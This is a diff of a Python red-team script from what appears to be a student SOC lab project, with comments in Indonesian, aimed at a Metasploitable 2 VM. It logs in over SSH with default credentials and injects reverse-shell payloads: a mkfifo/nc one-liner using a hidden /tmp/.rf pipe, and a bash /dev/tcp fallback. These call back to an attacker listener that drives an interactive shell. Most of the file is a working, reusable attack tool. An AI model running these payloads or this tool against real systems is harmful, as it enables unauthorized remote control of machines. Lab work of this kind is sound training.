@@ -4,17 +4,11 @@
   Mini SOC Project — Person A (Red Team)
   Scenario 3: Reverse Shell
 =============================================================
-  Target  : Metasploitable 2 @ 192.168.1.40
-  Attacker: Kali Linux       @ 192.168.1.10
+  Target  : Metasploitable 2 @ 192.168.100.40
+  Attacker: Kali Linux       @ 192.168.100.160
   Tactic  : T1059 - Command & Scripting Interpreter (MITRE ATT&CK)
             T1071 - Application Layer Protocol
   Tools   : paramiko (SSH), socket (listener)
-=============================================================
-  Cara kerja:
-    1. Script buka listener di port 4444 (Laptop A)
-    2. Script SSH masuk ke Metasploitable pakai credential hasil Scenario 2
-    3. Dari dalam Metasploitable, jalankan bash reverse shell → konek balik ke 192.168.1.10:4444
-    4. Attacker dapat interactive shell dari target
 =============================================================
 """
 
@@ -24,23 +18,28 @@ import threading
 import time
 import datetime
 import sys
+import select
 
 # ── Konfigurasi ──────────────────────────────────────────
-TARGET_IP     = "192.168.1.40"
-TARGET_PORT   = 22
-ATTACKER_IP   = "192.168.1.10"   # IP Laptop A — listener di sini
-LISTEN_PORT   = 4444
+TARGET_IP   = "192.168.100.40"
+TARGET_PORT = 22
+ATTACKER_IP = "192.168.100.160"
+LISTEN_PORT = 4444
 
-# Credential dari hasil Scenario 2
-SSH_USER      = "msfadmin"
-SSH_PASS      = "msfadmin"
+SSH_USER    = "msfadmin"
+SSH_PASS    = "msfadmin"
 
-# Reverse shell payload (bash one-liner)
-# Dijalankan di dalam Metasploitable via SSH
-REVSHELL_CMD  = (
-    f"bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1"
+# mkfifo payload — lebih reliable dari /dev/tcp di shell non-interaktif
+# Ini tidak bergantung pada bash built-in /dev/tcp yang kadang dinonaktifkan
+REVSHELL_CMD = (
+    f"rm -f /tmp/.rf; mkfifo /tmp/.rf; "
+    f"cat /tmp/.rf | /bin/bash -i 2>&1 | nc {ATTACKER_IP} {LISTEN_PORT} > /tmp/.rf"
 )
-# ─────────────────────────────────────────────────────────
+
+# Fallback jika nc tidak ada di target (Metasploitable punya nc, jadi ini aman)
+REVSHELL_CMD_DEVTCP = (
+    f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1'"
+)
 
 BANNER = """
 ╔══════════════════════════════════════════════════════╗
@@ -51,16 +50,15 @@ BANNER = """
 ╚══════════════════════════════════════════════════════╝
 """
 
+# ── Event: sinyal bahwa listener sudah siap sebelum SSH trigger ──
+listener_ready = threading.Event()
+
 
 # ══════════════════════════════════════════════════════════
-#  BAGIAN 1: Listener — terima koneksi balik dari target
+#  BAGIAN 1: Listener
 # ══════════════════════════════════════════════════════════
 
 def start_listener(listen_ip: str, listen_port: int):
-    """
-    Buka TCP listener di ATTACKER_IP:LISTEN_PORT.
-    Saat target konek balik, masuk ke interactive shell loop.
-    """
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
@@ -68,76 +66,91 @@ def start_listener(listen_ip: str, listen_port: int):
         server.bind((listen_ip, listen_port))
     except OSError as e:
         print(f"[!] Gagal bind {listen_ip}:{listen_port} — {e}")
-        print(f"[!] Coba: sudo lsof -i :{listen_port}  lalu kill prosesnya.")
+        print(f"[!] Port mungkin sudah dipakai. Coba: sudo lsof -i :{listen_port}")
+        listener_ready.set()   # unblock trigger thread agar tidak hang
         sys.exit(1)
 
     server.listen(1)
     print(f"[*] Listener aktif di {listen_ip}:{listen_port}")
     print(f"[*] Menunggu koneksi balik dari target...\n")
 
-    server.settimeout(30)   # timeout 30 detik kalau target tidak konek
+    # Sinyal ke trigger thread — listener sudah siap
+    listener_ready.set()
+
+    server.settimeout(35)
 
     try:
         conn, addr = server.accept()
     except socket.timeout:
-        print("[!] Timeout — target tidak konek dalam 30 detik.")
-        print("[!] Pastikan reverse shell berhasil dieksekusi di target.")
+        print("\n[!] Timeout — target tidak konek dalam 35 detik.")
+        print("[!] Tips:")
+        print("    - Pastikan tidak ada firewall yang blok port 4444")
+        print("    - Coba: sudo ufw allow 4444/tcp")
+        print("    - Test manual: buka terminal lain → nc -lvnp 4444")
+        print(f"    - Lalu SSH manual dan jalankan: {REVSHELL_CMD}")
         server.close()
         return
 
     print(f"[+] ✅ KONEKSI MASUK dari {addr[0]}:{addr[1]}")
-    print(f"[+] Reverse shell aktif! Ketik perintah di bawah:\n")
+    print(f"[+] Reverse shell aktif! Ketik perintah (exit/quit untuk keluar):\n")
     print(f"{'═'*54}")
 
-    # Interactive shell loop
+    conn.setblocking(False)
+
     try:
         while True:
-            print("shell> ", end="", flush=True)
-            cmd = input()
+            # Gunakan select() agar bisa baca dari socket DAN stdin bersamaan
+            readable, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
 
-            if not cmd.strip():
-                continue
+            for src in readable:
+                if src is conn:
+                    try:
+                        data = conn.recv(4096)
+                        if not data:
+                            print("\n[*] Koneksi ditutup oleh target.")
+                            return
+                        print(data.decode(errors="replace"), end="", flush=True)
+                    except (ConnectionResetError, BrokenPipeError):
+                        print("\n[*] Koneksi terputus.")
+                        return
 
-            if cmd.strip().lower() in ("exit", "quit", "q"):
-                conn.send(b"exit\n")
-                break
+                elif src is sys.stdin:
+                    cmd = sys.stdin.readline()
+                    if not cmd:
+                        return
+                    if cmd.strip().lower() in ("exit", "quit", "q"):
+                        try:
+                            conn.send(b"exit\n")
+                        except Exception:
+                            pass
+                        return
+                    try:
+                        conn.send(cmd.encode())
+                    except (BrokenPipeError, OSError):
+                        print("\n[*] Gagal kirim perintah — koneksi terputus.")
+                        return
 
-            conn.send((cmd + "\n").encode())
-
-            # Terima output
-            conn.settimeout(3)
-            output = b""
-            try:
-                while True:
-                    chunk = conn.recv(4096)
-                    if not chunk:
-                        break
-                    output += chunk
-            except socket.timeout:
-                pass
-
-            if output:
-                print(output.decode(errors="replace"), end="")
-
-    except (KeyboardInterrupt, EOFError):
-        print("\n[*] Sesi dihentikan oleh attacker.")
+    except KeyboardInterrupt:
+        print("\n[*] Sesi dihentikan (Ctrl+C).")
     finally:
-        conn.close()
+        try:
+            conn.close()
+        except Exception:
+            pass
         server.close()
         print(f"\n{'═'*54}")
         print("[*] Listener ditutup.")
 
 
 # ══════════════════════════════════════════════════════════
-#  BAGIAN 2: Trigger — SSH ke target & eksekusi reverse shell
+#  BAGIAN 2: SSH Trigger
 # ══════════════════════════════════════════════════════════
 
 def trigger_reverseshell(target: str, port: int, user: str, password: str, cmd: str):
-    """
-    SSH masuk ke target, lalu jalankan reverse shell payload.
-    Fungsi ini dipanggil di thread terpisah setelah listener siap.
-    """
-    time.sleep(2)   # tunggu listener siap dulu
+    # Tunggu sampai listener benar-benar siap (bukan sleep hardcode)
+    print("[*] Menunggu listener siap...")
+    listener_ready.wait(timeout=10)
+    time.sleep(0.5)   # sedikit buffer setelah bind
 
     print(f"[*] SSH ke {target}:{port} sebagai {user}...")
 
@@ -146,27 +159,44 @@ def trigger_reverseshell(target: str, port: int, user: str, password: str, cmd: 
 
     try:
         client.connect(
-            hostname     = target,
-            port         = port,
-            username     = user,
-            password     = password,
-            timeout      = 10,
+            hostname  = target,
+            port      = port,
+            username  = user,
+            password  = password,
+            timeout   = 10,
+            # Matikan agent & look_for_keys — lebih cepat di env lab
+            look_for_keys    = False,
+            allow_agent      = False,
         )
-        print(f"[+] SSH berhasil! Mengeksekusi reverse shell payload...")
+        print(f"[+] SSH berhasil!")
         print(f"[*] Payload: {cmd}\n")
 
-        # Eksekusi — ini akan langsung konek balik ke listener
-        # get_pty=True supaya dapat interactive shell
-        stdin, stdout, stderr = client.exec_command(cmd, get_pty=True, timeout=60)
+        # Buka channel interaktif lewat invoke_shell, bukan exec_command
+        # exec_command dengan get_pty tidak bisa forward reverse shell dengan benar
+        channel = client.invoke_shell()
+        time.sleep(0.5)
+        channel.send(cmd + "\n")
+
+        # Biarkan channel tetap hidup selama listener masih aktif
+        # Channel akan otomatis mati saat listener ditutup atau script exit
+        timeout = 40
+        elapsed = 0
+        while elapsed < timeout:
+            time.sleep(1)
+            elapsed += 1
+            if channel.closed:
+                break
 
     except paramiko.AuthenticationException:
-        print(f"[!] SSH auth gagal — pastikan credential benar ({user}:{password})")
-        print(f"[!] Jalankan Scenario 2 dulu untuk mendapatkan credential yang valid.")
+        print(f"[!] SSH auth gagal ({user}:{password})")
+        print(f"[!] Jalankan Scenario 2 dulu untuk credential yang valid.")
     except (socket.timeout, paramiko.SSHException, OSError) as e:
         print(f"[!] SSH error: {e}")
     finally:
-        # Jangan langsung close — biarkan reverse shell hidup
-        pass
+        try:
+            client.close()
+        except Exception:
+            pass
 
 
 # ══════════════════════════════════════════════════════════
@@ -185,8 +215,7 @@ if __name__ == "__main__":
     print(f"[*] Step 2: SSH ke {TARGET_IP} → trigger reverse shell")
     print(f"[*] Step 3: Target konek balik → interactive shell\n")
 
-    # Jalankan SSH trigger di thread terpisah
-    # supaya listener bisa siap dulu sebelum payload dikirim
+    # SSH trigger di background thread
     trigger_thread = threading.Thread(
         target = trigger_reverseshell,
         args   = (TARGET_IP, TARGET_PORT, SSH_USER, SSH_PASS, REVSHELL_CMD),
@@ -194,5 +223,5 @@ if __name__ == "__main__":
     )
     trigger_thread.start()
 
-    # Listener jalan di main thread (blocking)
+    # Listener di main thread (blocking sampai sesi selesai)
     start_listener(ATTACKER_IP, LISTEN_PORT)
